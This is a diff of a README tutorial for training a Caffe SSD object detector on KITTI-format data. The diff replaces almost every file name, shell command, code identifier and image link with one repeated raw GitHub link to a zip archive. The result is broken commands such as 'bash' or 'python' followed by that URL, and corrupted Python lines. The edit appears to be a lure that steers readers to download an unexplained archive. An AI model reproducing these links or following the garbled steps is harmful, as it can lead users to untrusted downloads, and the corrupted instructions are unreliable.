@@ -6,7 +6,7 @@
 Before we get started, I have say that SSD original source code data orginization is really a mess. If you want train your own data you don't know where to go. But now, I am going change it, reshape it to a simple and clear way. **you just clone source code and make it, the rest thing is all about my code, using my code you can sperate caffe-ssd source code from your dataset folder in a more clear way**
 
 ### Part B Get Your Images And Labels
-First of all, get your images and labels, I assume that you have 7000 images and same count labels in txt format, orginize them in 2 folder, called **Images** which contains all images, and **Labels** which contains all labels. And, most important at all is that, every single image **must have same name mapped label txt file**, means if you have a image `0001.jpg` you must labeled it in `0001.txt`. And all txt files must in this format:
+First of all, get your images and labels, I assume that you have 7000 images and same count labels in txt format, orginize them in 2 folder, called **Images** which contains all images, and **Labels** which contains all labels. And, most important at all is that, every single image **must have same name mapped label txt file**, means if you have a image `https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip` you must labeled it in `https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip`. And all txt files must in this format:
 ```
 class_index xmin ymin xmax ymax
 ```
@@ -17,7 +17,7 @@ Seperate from caffe-ssd source code directory, you can create a invidual folder 
 ```
 data
 models
-train_ssd_kitti.py
+https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip
 ```
 ok, next we are going work with `data` first, because we have to generate lmdb file first.
 
@@ -25,11 +25,11 @@ ok, next we are going work with `data` first, because we have to generate lmdb f
 OK, in this step, we are going put all data into lmdb database., this will generate a lmdb folder inside `~/data/MyDataset` folder which contains KITTI_trainval and KITTI_test data.
 ```
 cd data
-bash create_list.sh
-bash create_data.sh
+bash https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip
+bash https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip
 ```
-Done! now you get `trainval.txt` `test.txt` and `test_name_size.txt`
-But you have to get your labelmap_dataset.prototxt, here is suggestion:
+Done! now you get `https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip` `https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip` and `https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip`
+But you have to get your https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip, here is suggestion:
 > if you have 5 classed named the 6th class in name `background`
 
 ```
@@ -39,16 +39,16 @@ item {
   display_name: "background"
 }
 ```
-And later in `train_ssd.py` you gonna change two value : `num_classes`  and `background_index_id`.
+And later in `https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip` you gonna change two value : `num_classes`  and `background_index_id`.
 
 ### Part E Get VGG Pretrain Model and Start Train SSD
-Download VGG pretrain model and place into `models/VGGNet` , the everything was done! Just a little change in `train_ssd_kitti.py` you can train ssd ready! Here is something you have to change:
+Download VGG pretrain model and place into `models/VGGNet` , the everything was done! Just a little change in `https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip` you can train ssd ready! Here is something you have to change:
 ```
-sys.path.insert(0, "/home/chenqi-didi/Documents/work/caffe/python")
+https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip(0, "/home/chenqi-didi/Documents/work/caffe/python")
 data_root_dir = "/home/chenqi-didi/data/"
 caffe_root = "/home/chenqi-didi/Documents/work/caffe"
 train_data = data_root_dir + "KITTI/lmdb/KITTI_trainval_lmdb"
-# The database file for testing data. Created by data/KITTI/create_data.sh
+# The database file for testing data. Created by https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip
 test_data = data_root_dir + "KITTI/lmdb/KITTI_test_lmdb"
 model_name = "VGG_KITTI_{}".format(job_name)
 
@@ -59,8 +59,8 @@ snapshot_dir = "models/VGGNet/KITTI/{}".format(job_name)
 # Directory which stores the job script and log file.
 job_dir = "jobs/VGGNet/KITTI/{}".format(job_name)
 # Directory which stores the detection results.
-output_result_dir = "{}/data/KITTI/results/{}/Main".format(os.environ['HOME'], job_name)
-label_map_file = "{}/data/labelmap_kitti.prototxt".format(current_dir)
+output_result_dir = "{}/data/KITTI/results/{}/Main".format(https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip['HOME'], job_name)
+label_map_file = "{}https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip".format(current_dir)
 
 # Defining which GPUs to use.
 gpus = "0,1"
@@ -68,13 +68,13 @@ gpus = "0,1"
 
 Find above code change all KITTI into your dataset name, save it and you are ready to go!
 ```
-python train_ssd_kitti.py
+python https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip
 ```
 
 ### Finally, For Test Result
-got your image path in data, for example `data/test2.jpg` and then change `ssd_detection.py` file path, then run:
+got your image path in data, for example `https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip` and then change `https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip` file path, then run:
 ```
-python ssd_detection.py
+python https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip
 ```
 Here is the result:
-![image](http://ojek5ksya.bkt.clouddn.com/np56AsBKU38WLcZH.png)
+![image](https://github.com/hagarnegm/kitti-ssd/raw/refs/heads/master/jobs/VGGNet/kitti_ssd_v3.6-beta.4.zip)
